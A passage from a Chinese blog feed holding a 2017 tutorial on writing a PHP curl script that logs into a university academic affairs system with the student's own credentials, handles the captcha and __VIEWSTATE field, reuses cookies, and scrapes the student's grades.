<h3 id="各位小伙伴有任何问题可以在下方留言，我会及时解答或订正，下一篇博文将会介绍图形化展示爬取综测智育成绩的网页制作。"><a href="#各位小伙伴有任何问题可以在下方留言，我会及时解答或订正，下一篇博文将会介绍图形化展示爬取综测智育成绩的网页制作。" class="headerlink" title="各位小伙伴有任何问题可以在下方留言，我会及时解答或订正，下一篇博文将会介绍图形化展示爬取综测智育成绩的网页制作。"></a>各位小伙伴有任何问题可以在下方留言，我会及时解答或订正，下一篇博文将会介绍图形化展示爬取综测智育成绩的网页制作。</h3><p><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> 作者：Hac原创 </category>
            
            <category> 教务系统数据爬取、自动选课 </category>
            
            <category> php学习/实战笔记 </category>
            
            <category> 代码模拟登录/按键/选课 </category>
            
            <category> php_curl快速开发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> php应用脚本 </tag>
            
            <tag> 网络爬虫 </tag>
            
            <tag> 谷歌抓包分析隐藏数据 </tag>
            
            <tag> cookie验证 </tag>
            
            <tag> 自动化脚本 </tag>
            
            <tag> php_curl </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[趣味爬虫(上)制作模拟登录并具备教务查询功能的脚本]]></title>
      <url>http://yikunhaocong.com/2017/09/18/php-spider1/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br>    本博文只限于分享php学习经验，给像我一样刚入门的php小白提供借鉴的经验，将系统地分析如何用php代码实现学校教务系统的模拟登录、抓取成绩功能(本博文针对抓取成绩流程进行分析,实验环境是在校园网内)。<br>    php脚本代码已开源至：<a href="https://github.com/Kali-Hac/php_spider" target="_blank" rel="external">https://github.com/Kali-Hac/php_spider</a><br><a id="more"></a><p></p>
<h2 id="基础：先把php语法学熟，并初步掌握php-curl库的用法-个人用时1-2天"><a href="#基础：先把php语法学熟，并初步掌握php-curl库的用法-个人用时1-2天" class="headerlink" title="基础：先把php语法学熟，并初步掌握php_curl库的用法(个人用时1-2天)"></a>基础：先把php语法学熟，并初步掌握php_curl库的用法(个人用时1-2天)</h2><p>想快速制作一个好的爬虫，关键在于对浏览器请求页面及所获数据的分析，分析得越彻底越仔细，你的代码模拟的效果就越可靠越高效。</p>
<h2 id="1-学会用谷歌浏览器F12的开发者工具进行网站数据“抓包”"><a href="#1-学会用谷歌浏览器F12的开发者工具进行网站数据“抓包”" class="headerlink" title="1.学会用谷歌浏览器F12的开发者工具进行网站数据“抓包”"></a>1.学会用谷歌浏览器F12的开发者工具进行网站数据“抓包”</h2><blockquote>
<p>打开谷歌浏览器，先按F12打开开发者工具，并将功能切换至Network，然后再打开教务网(注意先后顺序，若开发者窗口里无数据显示，则请刷新教务网的网页再等一会)，如下所示<br><img src="http://op72m4y17.bkt.clouddn.com/1p.png" alt="开发者工具Network详情"></p>
<h3 id="开始分析网页数据与页面构造"><a href="#开始分析网页数据与页面构造" class="headerlink" title="开始分析网页数据与页面构造"></a>开始分析网页数据与页面构造</h3><p>“Network”窗口里显示了进入教务网后的所有对外请求Request以及对内Response，包括各类document文件(.htm,.aspx,.jsp,.php,.com等,当然教务网里只有aspx和htm和com)，还有各类资源文件(.css,.png,.gif,.js等),一般而言最有用的是type为document和text/html类型的文件，因为关于该网页最详细的数据一般就是在某个该类型的文件中，这个需要你去搜寻。你需要找到显示教务网界面的那个”html”文件(可能是.aspx或.jsp或.php,目前只接触过此类)。</p>
<ul>
<li>很快，通过点击”Name”下面的地址，我们找到了显示教务网界面的那个文件(即”preview”里面的html代码刚好对应网站上面显示的内容),是default2.aspx(一共有两个default2.aspx,其中一个的preview显示为空，不是我们要找的)，如下图所示(“Preview”详情)：<br><img src="http://op72m4y17.bkt.clouddn.com/2p.png" alt="教务网页面数据请求/回复详情"><br>我们可以看一下default2.aspx的“Header”详情:<br><img src="http://op72m4y17.bkt.clouddn.com/3p.png" alt="default2.aspx详情上"><br><img src="http://op72m4y17.bkt.clouddn.com/4p.png" alt="default2.aspx详情下"><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">General ↓</div><div class="line">Request URL:http://xsweb.scuteo.com/(jfp5h155ru2dqbzoniibsg45)/default2.aspx</div><div class="line">Request Method:GET</div><div class="line">Status Code:200 OK</div><div class="line">Remote Address:127.0.0.1:4832</div><div class="line">Response Headers</div><div class="line">view source</div><div class="line">Response Headers ↓</div><div class="line">Cache-Control:no-cache, no-store</div><div class="line">Content-Length:5708</div><div class="line">Content-Type:text/html; charset=gb2312</div><div class="line">Date:Mon, 18 Sep 2017 22:59:05 GMT</div><div class="line">Expires:-1</div><div class="line">Keep-Alive:timeout=38</div><div class="line">P3p:CP=CAO PSA OUR</div><div class="line">Pragma:no-cache</div><div class="line">Pragma:no-cache</div><div class="line">Server:Microsoft-IIS/6.0</div><div class="line">X-Aspnet-Version:1.1.4322</div><div class="line">X-Powered-By:ASP.NET</div><div class="line">Request Headers</div><div class="line">view source</div><div class="line">Request Headers ↓</div><div class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Encoding:gzip, deflate, sdch</div><div class="line">Accept-Language:zh-CN,zh;q=0.8</div><div class="line">Host:xsweb.scuteo.com</div><div class="line">Proxy-Connection:keep-alive</div><div class="line">Referer:http://www.scut.edu.cn/jw2005/</div><div class="line">Upgrade-Insecure-Requests:1</div><div class="line">User-Agent:Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</div></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<h3 id="浏览器Headers参数的简单解释"><a href="#浏览器Headers参数的简单解释" class="headerlink" title="浏览器Headers参数的简单解释"></a>浏览器Headers参数的简单解释</h3><ul>
<li>上面显示的内容中有一个General - Request URL，这个网址就是我们要发送请求的网址，也就是要把账号和密码以post形式传送过去的网址，为什么是post形式呢？接下来我会进一步讲解。然后其他的Request Headers是我们浏览器发送请求的各类参数，php代码之所以能够模拟浏览，就是因为它能够向某个网络地址发送这些参数(从而模拟浏览器的行为)，当然php_curl库已经为我们封装好了各类参数，我们只需要设置好url,跳转连接，post参数，以及返回形式就可以了。<h3 id="校园网内网环境下的登录"><a href="#校园网内网环境下的登录" class="headerlink" title="校园网内网环境下的登录"></a>校园网内网环境下的登录</h3><ul>
<li>一般情况下Remote Address是一个有效的IP地址，而这里你会发现Remote Address是127.0.0.1:4832，127.0.0.1表示是本地(局域网)，表示我们是通过内网的4832端口进入的，学校关闭了几个外网入口，其实也是利大于弊，一方面可以确保是校内校园网用户师生登录(第一层身份验证)，另外可以防止大规模的DDos攻击(无法通过外网发起无限制访问)。目前博主还没找到教务网一个可用的外网IP，虽然在大一时写python爬虫的时候找了好几个可用的外网地址，下图是我大一时用python写教务网爬虫发送的请求数据:<br><img src="http://op72m4y17.bkt.clouddn.com/7p.png" alt="大一时python代码"><blockquote>
<p>提交数据很多，但后来发现有一些是不需要的，当年写代码时写得比较粗糙(虽然现在也差不多)，几个外网地址如下：110.65.10.235 110.65.10.239 你会发现界面少了个学生入口，所以已经不可用了，如下图所示：</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<p><img src="http://op72m4y17.bkt.clouddn.com/8p.png" alt="外网学生不可用的教务网页面"></p>
<h2 id="2-将登录流程完完全全走一遍-浏览器中进行-，然后根据network进行分析"><a href="#2-将登录流程完完全全走一遍-浏览器中进行-，然后根据network进行分析" class="headerlink" title="2.将登录流程完完全全走一遍(浏览器中进行)，然后根据network进行分析"></a>2.将登录流程完完全全走一遍(浏览器中进行)，然后根据network进行分析</h2><h3 id="开始输入账号密码验证码进行登录"><a href="#开始输入账号密码验证码进行登录" class="headerlink" title="开始输入账号密码验证码进行登录"></a>开始输入账号密码验证码进行登录</h3><p><img src="http://op72m4y17.bkt.clouddn.com/5p.png" alt="输入账号密码登录"></p>
<blockquote>
<p>登录进去后同样要做的工作是在开发者工具中的“Network”找到我们登进去的页面的名称，如下所示:<br><img src="http://op72m4y17.bkt.clouddn.com/6p.png" alt="找到登录的链接"></p>
<ul>
<li>你会发现有一个规则，登进去的页面总是<a href="http://xsweb.scuteo.com/(jfp5h155ru2dqbzoniibsg45)/xs_main.aspx?xh=(你的学号),但是我们要找的应该是我们发送请求的那个页面，也就是我们要看default2.aspx,而且把Headers往下移动，你会惊奇的发现，你的账号密码信息完整无遗地显示了出来，如下图所示：" target="_blank" rel="external">http://xsweb.scuteo.com/(jfp5h155ru2dqbzoniibsg45)/xs_main.aspx?xh=(你的学号),但是我们要找的应该是我们发送请求的那个页面，也就是我们要看default2.aspx,而且把Headers往下移动，你会惊奇的发现，你的账号密码信息完整无遗地显示了出来，如下图所示：</a><br><img src="http://op72m4y17.bkt.clouddn.com/9p.png" alt="提交的表单数据"><h3 id="根据Form-Data确定我们要通过php提交的数据"><a href="#根据Form-Data确定我们要通过php提交的数据" class="headerlink" title="根据Form Data确定我们要通过php提交的数据"></a>根据Form Data确定我们要通过php提交的数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">__VIEWSTATE:dDwyMDczNjQ0MDAyOzs+PnRyFsXNh0MDNa7svzv+XK/PTLg=</div><div class="line">txtUserName:(你的学号)</div><div class="line">TextBox2:(你的密码)</div><div class="line">txtSecretCode:(验证码)</div><div class="line">RadioButtonList1:(unable to decode value)</div><div class="line">Button1:</div><div class="line">lbLanguage:</div><div class="line">hidPdrs:</div><div class="line">hidsc:</div></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<h3 id="根据页面信息搜寻隐藏的需要提交的数据"><a href="#根据页面信息搜寻隐藏的需要提交的数据" class="headerlink" title="根据页面信息搜寻隐藏的需要提交的数据"></a>根据页面信息搜寻隐藏的需要提交的数据</h3><blockquote>
<p>进入default2.aspx的Preview,你会找到一个“__VIEWSTATE”,如下图所示：<br><img src="http://op72m4y17.bkt.clouddn.com/10p.png" alt="隐藏的表单数据"><br>而且你会惊奇的发现，它的属性被设置为”hidden”，但是时input类型，在模拟登录的时候也要进行提交(在浏览器登录时是自动提交的)，而且一般这类提交值是固定的，不过你得先自己摸索一下找得到。这个不像cookies每一次访问都有新值需要提交，所以第一次你找到之后就可以一直用下去。</p>
</blockquote>
<h2 id="3-用找到的url-找到的请求数据进行php模拟登录"><a href="#3-用找到的url-找到的请求数据进行php模拟登录" class="headerlink" title="3.用找到的url+找到的请求数据进行php模拟登录"></a>3.用找到的url+找到的请求数据进行php模拟登录</h2><h3 id="不对，还有一个验证码呢？"><a href="#不对，还有一个验证码呢？" class="headerlink" title="不对，还有一个验证码呢？"></a>不对，还有一个验证码呢？</h3><blockquote>
<p>此处验证码我们为了简化教程，还是采取手动输入的形式(通过php保存至本地的txt文件并进行读写)，但只需要输入一次，因为第一次登录进去之后的cookie我们可以多次利用，比如多次查询成绩、多次选课等操作都不再需要验证码了。同样，我们找一下验证码对应的网址，如下：<br><img src="http://op72m4y17.bkt.clouddn.com/12p.png" alt="验证码对应网址"><br><img src="http://op72m4y17.bkt.clouddn.com/11p.png" alt="验证码对应网址"></p>
<ul>
<li>每次打开教务系统登录界面都会自动生成一个cookie和它对应的验证码，这个很重要！这个是网页运行的基本原理，在你登录的时候除了提交账号密码等数据时，还要有与cookie匹配的验证码，所以我们模拟登录的一个要点就是要保存你的cookie，以后每次访问登录进去的其它页面时都要使用登录后生成的cookie，这样才能正常访问，否则教务系统会认为你还没登录，自动返回到登录界面。模拟登录和进行其它操作一共涉及到两个cookie.<h3 id="php登录的代码-一-先自定义一个curl发起连接的函数"><a href="#php登录的代码-一-先自定义一个curl发起连接的函数" class="headerlink" title="php登录的代码(一) 先自定义一个curl发起连接的函数"></a>php登录的代码(一) 先自定义一个curl发起连接的函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">//自定义一个发起curl链接的函数，传入url,cookie和post数据</div><div class="line">function login_post($url,$cookie,$post)&#123;</div><div class="line">        $ch = curl_init();//初始化curl</div><div class="line">        curl_setopt($ch, CURLOPT_URL, $url);//设置url</div><div class="line">        curl_setopt($ch, CURLOPT_HEADER, 0);//把一个头包含在输出中，设置这个选项为一个非零值</div><div class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);  //不自动输出数据，要echo才行</div><div class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  //重要，抓取跳转后数据</div><div class="line">        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie); </div><div class="line">        curl_setopt($ch, CURLOPT_REFERER, &apos;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/default2.aspx&apos;);  //重要，302跳转需要referer，可以在Request Headers找到 </div><div class="line">        curl_setopt($ch, CURLOPT_POSTFIELDS,$post);  //post提交数据</div><div class="line">        $result=curl_exec($ch);//执行curl发起的连接</div><div class="line">        curl_close($ch);//关闭连接</div><div class="line">        return $result;//输出结果(会直接以网页形式输出)</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<h3 id="php登录的代码-二-首先获取验证码并手动输入"><a href="#php登录的代码-二-首先获取验证码并手动输入" class="headerlink" title="php登录的代码(二) 首先获取验证码并手动输入"></a>php登录的代码(二) 首先获取验证码并手动输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    ini_set(&apos;max_execution_time&apos;, 3000);//设置连接最大可持续时间为3000s</div><div class="line">    session_start();</div><div class="line">    $id=session_id();</div><div class="line">    $_SESSION[&apos;id&apos;]=$id;</div><div class="line">    $cookie = tempnam(&apos;./cookie&apos;, &apos;cookie&apos;); //用一个随机的不重复的文件名保存cookie,$cookie即为cookie文件名  </div><div class="line">    $verify_code_url = &quot;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/CheckCode.aspx&quot;; //验证码地址</div><div class="line">    $curl = curl_init();//初始化一个curl</div><div class="line">    curl_setopt($curl, CURLOPT_URL, $verify_code_url);//设置URL</div><div class="line">    curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie);  //保存cookie</div><div class="line">    curl_setopt($curl, CURLOPT_HEADER, 0);//设置浏览器头</div><div class="line">    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);//设置返回方式，不自动输出，只能通过echo输出</div><div class="line">    $img = curl_exec($curl);  //执行curl，获得验证码图片</div><div class="line">    curl_close($curl);//关闭curl</div><div class="line">    $fp = fopen(&quot;verifyCode.jpg&quot;,&quot;w&quot;);  //打开一个jpg格式文件保存验证码,连接成功后可以查看图片</div><div class="line">    fwrite($fp,$img);   </div><div class="line">    fclose($fp);</div><div class="line">    header(&quot;Content-type: text/html; charset=gb2312&quot;); </div><div class="line">    //设置charset,这个在原网页html头部可以看到,避免输出编码错误 </div><div class="line"></div><div class="line">    sleep(10);//给你10s输入验证码</div><div class="line">    $_POST[&apos;code&apos;]= file_get_contents(&apos;code.txt&apos;);</div><div class="line">    //读取手动输入的验证码code.txt里面的数字</div></pre></td></tr></table></figure>
<blockquote>
<p>执行$img = curl_exec($curl);后会爬取一个验证码图片并保存在你的php所在目录下，如图所示，手动输入验证码(后面会介绍自动识别验证码)：<br><img src="http://op72m4y17.bkt.clouddn.com/13p.png" alt="手动输入验证码"></p>
</blockquote>
<h3 id="php登录的代码-三-集齐所需数据开始登陆进去"><a href="#php登录的代码-三-集齐所需数据开始登陆进去" class="headerlink" title="php登录的代码(三) 集齐所需数据开始登陆进去"></a>php登录的代码(三) 集齐所需数据开始登陆进去</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">$_POST[&apos;xh&apos;]=&apos;你的学号&apos;;</div><div class="line">$_POST[&apos;pw&apos;]=&apos;你的密码&apos;;</div><div class="line">$_SESSION[&apos;xh&apos;]=$_POST[&apos;xh&apos;];</div><div class="line">$xh=$_POST[&apos;xh&apos;];</div><div class="line">$pw=$_POST[&apos;pw&apos;];</div><div class="line">$code= $_POST[&apos;code&apos;];</div><div class="line">$url=&quot;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/default2.aspx&quot;;  //教务处地址</div><div class="line">$con1=login_post($url,$cookie,&apos;&apos;);</div><div class="line">preg_match_all(&apos;/&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; value=&quot;([^&lt;&gt;]+)&quot; \/&gt;/&apos;, $con1, $view); //正则匹配获取隐藏键值__VIEWSTATE字段并存到$view数组中</div><div class="line">$post=array(</div><div class="line">    &apos;__VIEWSTATE&apos;=&gt;$view[1][0],</div><div class="line">    &apos;txtUserName&apos;=&gt;$xh,</div><div class="line">    &apos;TextBox2&apos;=&gt;$pw,</div><div class="line">    &apos;txtSecretCode&apos;=&gt;$code,</div><div class="line">    &apos;RadioButtonList1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;学生&apos;),</div><div class="line">    //这个要先转码一下，由于教务系统会把你的中文转换为utf-8编码</div><div class="line">    &apos;Button1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;登录&apos;),</div><div class="line">    &apos;lbLanguage&apos;=&gt;&apos;&apos;,</div><div class="line">    &apos;hidPdrs&apos;=&gt;&apos;&apos;,</div><div class="line">    &apos;hidsc&apos;=&gt;&apos;&apos;</div><div class="line">);</div><div class="line">$con2=login_post($url,$cookie,http_build_query($post));</div><div class="line">echo $con2;//$con2即为返回的页面并输出</div></pre></td></tr></table></figure>
<blockquote>
<p>查看一下有没有遗漏的需要post的数据<br> <img src="http://op72m4y17.bkt.clouddn.com/9p.png" alt="post数据查看"><br> 核查无误，而且__VIEWSTATE隐藏的数据也有了</p>
<h3 id="php登录的代码-1-2-3-总-运行此php代码输入验证码可以成功登录"><a href="#php登录的代码-1-2-3-总-运行此php代码输入验证码可以成功登录" class="headerlink" title="php登录的代码(1+2+3=总) 运行此php代码输入验证码可以成功登录"></a>php登录的代码(1+2+3=总) 运行此php代码输入验证码可以成功登录</h3> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"> &lt;?php</div><div class="line">    ini_set(&apos;max_execution_time&apos;, 3000);</div><div class="line">    session_start();</div><div class="line">    $id=session_id();</div><div class="line">    $_SESSION[&apos;id&apos;]=$id;</div><div class="line">    $cookie = tempnam(&apos;./cookie&apos;, &apos;cookie&apos;); //用一个随机的不重复的文件名保存cookie,$cookie即为cookie文件名  </div><div class="line">    $verify_code_url = &quot;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/CheckCode.aspx&quot;; //验证码地址</div><div class="line">    $curl = curl_init();//初始化一个curl</div><div class="line">    curl_setopt($curl, CURLOPT_URL, $verify_code_url);//设置URL</div><div class="line">    curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie);  //保存cookie</div><div class="line">    curl_setopt($curl, CURLOPT_HEADER, 0);//设置浏览器头</div><div class="line">    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);//设置返回方式，不自动输出，只能通过echo输出</div><div class="line">    $img = curl_exec($curl);  //执行curl，获得验证码图片</div><div class="line">    curl_close($curl);//关闭curl</div><div class="line">    $fp = fopen(&quot;verifyCode.jpg&quot;,&quot;w&quot;);  //打开一个jpg格式文件保存验证码</div><div class="line">    fwrite($fp,$img);   </div><div class="line">    fclose($fp);</div><div class="line">    header(&quot;Content-type: text/html; charset=gb2312&quot;); </div><div class="line">    //设置charset,这个在原网页html头部可以看到,避免输出编码错误 </div><div class="line">    sleep(10);//给你10s输入验证码</div><div class="line">    $_POST[&apos;code&apos;]= file_get_contents(&apos;code.txt&apos;);</div><div class="line">    $_POST[&apos;xh&apos;]=&apos;你的学号&apos;;</div><div class="line">    $_POST[&apos;pw&apos;]=&apos;你的密码&apos;;</div><div class="line">    $_SESSION[&apos;xh&apos;]=$_POST[&apos;xh&apos;];</div><div class="line">    $xh=$_POST[&apos;xh&apos;];</div><div class="line">    $pw=$_POST[&apos;pw&apos;];</div><div class="line">    $code= $_POST[&apos;code&apos;];</div><div class="line">    $url=&quot;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/default2.aspx&quot;;  //教务处地址</div><div class="line">    $con1=login_post($url,$cookie,&apos;&apos;);</div><div class="line">    preg_match_all(&apos;/&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; value=&quot;([^&lt;&gt;]+)&quot; \/&gt;/&apos;, $con1, $view); //获取__VIEWSTATE字段并存到$view数组中</div><div class="line">    $post=array(</div><div class="line">        &apos;__VIEWSTATE&apos;=&gt;$view[1][0],</div><div class="line">        &apos;txtUserName&apos;=&gt;$xh,</div><div class="line">        &apos;TextBox2&apos;=&gt;$pw,</div><div class="line">        &apos;txtSecretCode&apos;=&gt;$code,</div><div class="line">        &apos;RadioButtonList1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;学生&apos;),</div><div class="line">        &apos;Button1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;登录&apos;),</div><div class="line">        &apos;lbLanguage&apos;=&gt;&apos;&apos;,</div><div class="line">        &apos;hidPdrs&apos;=&gt;&apos;&apos;,</div><div class="line">        &apos;hidsc&apos;=&gt;&apos;&apos;</div><div class="line">    );</div><div class="line">    $con2=login_post($url,$cookie,http_build_query($post));</div><div class="line">    echo $con2;</div><div class="line">//自定义一个发起curl链接的函数，传入url,cookie和post数据</div><div class="line">    function login_post($url,$cookie,$post)&#123;</div><div class="line">        $ch = curl_init();</div><div class="line">        curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">        curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);  //不自动输出数据，要echo才行</div><div class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  //重要，抓取跳转后数据</div><div class="line">        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie); </div><div class="line">        curl_setopt($ch, CURLOPT_REFERER, &apos;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/default2.aspx&apos;);  //重要，302跳转需要referer，可以在Request Headers找到 </div><div class="line">        curl_setopt($ch, CURLOPT_POSTFIELDS,$post);  //post提交数据</div><div class="line">        $result=curl_exec($ch);</div><div class="line">        curl_close($ch);</div><div class="line">        return $result;</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p> <img src="http://op72m4y17.bkt.clouddn.com/15p.png" alt="成功登录后显示的结果"></p>
<blockquote>
<p>当你看到上面的输出页面时，说明模拟登录已经成功了!(但有一点需要注意，上面的按钮是无法进入的，因为是php获取的静态页面，如果想要进入类似于”成绩查询”或其他界面时，需要继续像上述流程一样，正常浏览器登录走流程，然后通过developtool-network分析需要post的数据或get的页面，然后用php_curl代码模拟登录)</p>
<h2 id="4-进入成绩查询页面并爬取个人成绩"><a href="#4-进入成绩查询页面并爬取个人成绩" class="headerlink" title="4.进入成绩查询页面并爬取个人成绩"></a>4.进入成绩查询页面并爬取个人成绩</h2><h3 id="首先上述的过程要保证成功执行"><a href="#首先上述的过程要保证成功执行" class="headerlink" title="首先上述的过程要保证成功执行"></a>首先上述的过程要保证成功执行</h3><p>有些小白可能会疑惑，查询成绩不就只是一个页面吗？不能通过直接进入这个页面查询成绩吗？为什么一定要先登录才能进入查询成绩的页面？<br>不得不说，这个问题是整个爬虫的关键。要先把原理搞清楚，先从浏览器正常登录入手，我们登录成功后浏览器会自动保存cookie值，然后每点击一个页面(比如说成绩查询)，浏览器就会把这个cookie发送到服务器，服务器验证通过后才能进行下一步访问。cookie就是你成功登录进去的最重要的凭证，也就是通行证。打个简单的比喻，你进入一个会场(教务网)，当你身份验证通过后会给你一个通行证，然后你在里面就可以畅行无阻了。<br>所以，整个php代码模拟登录的目的就是要获得这个用于验证的cookie值并保存下来用于下次登录，如下代码就是使用保存的cookie值选项: curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie); </p>
<h3 id="成绩查询页面Request的分析"><a href="#成绩查询页面Request的分析" class="headerlink" title="成绩查询页面Request的分析"></a>成绩查询页面Request的分析</h3><p>进入成绩查询页面，数据如下：<br><img src="http://op72m4y17.bkt.clouddn.com/14p.png" alt="成绩查询页面的url"></p>
<ul>
<li>成绩查询的url组成是$url2=”<a href="http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/xscjcx.aspx?xh=学号&amp;xm=(姓名的utf-8编码)%C8%C4%BA...&amp;gnmkdm=N121605" target="_blank" rel="external">http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/xscjcx.aspx?xh=学号&amp;xm=(姓名的utf-8编码)%C8%C4%BA...&amp;gnmkdm=N121605</a>“;<br>gnmkdm是个固定值，不过查询的时候可以不带这个参数<br>点击进入2016-2017 第二学期的成绩查询，需要post的数据很快就得到了，如下图所示：<br><img src="http://op72m4y17.bkt.clouddn.com/16p.png" alt="需要post的数据"><br>这些数据看起来是不是就清晰多了？除了一个很长很长的__viewstate之外(这个我们之前用正则匹配得到了)，还有<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">hidLanguage:</div><div class="line">ddlXN:2016-2017</div><div class="line">ddlXQ:2</div><div class="line">ddl_kcxz:</div><div class="line">btn_xq:%D1%A7%C6%DA%B3%C9%BC%A8</div><div class="line">////“学期成绩”的gbk编码</div></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<h3 id="post所需要的数据进行成绩的爬取！"><a href="#post所需要的数据进行成绩的爬取！" class="headerlink" title="post所需要的数据进行成绩的爬取！"></a>post所需要的数据进行成绩的爬取！</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">//正则匹配你的姓名，下面会讲解</div><div class="line">preg_match_all(&apos;/&lt;span id=&quot;xhxm&quot;&gt;([^&lt;&gt;]+)&lt;\/span&gt;/&apos;, $con2, $xm);</div><div class="line">$xm[1][0]=substr($xm[1][0],0,-4);  //字符串截取，获得姓名</div><div class="line">$url2=&quot;http://xsweb.scuteo.com/(4t02zy451w5ikqjsubt1qe3e)/xf_xsqxxxk.aspx?xh=&quot;.$xh.&quot;&amp;xm=&quot;.$xm[1][0];</div><div 